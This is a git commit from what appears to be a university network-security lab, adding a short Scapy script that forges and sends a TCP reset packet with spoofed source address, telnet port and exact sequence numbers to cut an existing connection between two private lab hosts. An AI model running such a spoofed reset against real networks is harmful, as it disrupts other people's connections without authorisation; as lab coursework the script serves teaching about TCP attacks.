2dab92a4a3c6de7320040356258982b205b6d392
l+l l +K <yifu.w@wustl.edu>
2018-09-11 22:11:55 -0500

    YIFU WANG

--- 571/L1/RST.py
+++ 571/L1/RST.py
@@ -1,8 +1,9 @@
 #!/usr/bin/python3
-from scapy/all import *
+from scapy.all import *
 
-ip = IP(src="", dst="")
-tcp = TCP(sport=0, dport=0, flags="0.0.0.0", seq=0, ack=0)
+ip = IP(src="192.168.137.150", dst="192.168.137.140")
+tcp = TCP(sport=46176, dport=23, flags="R", seq=3375652917, ack=1837764021)
 pkt = ip/tcp
 ls(pkt)
+print(pkt)
 send(pkt, verbose=0)
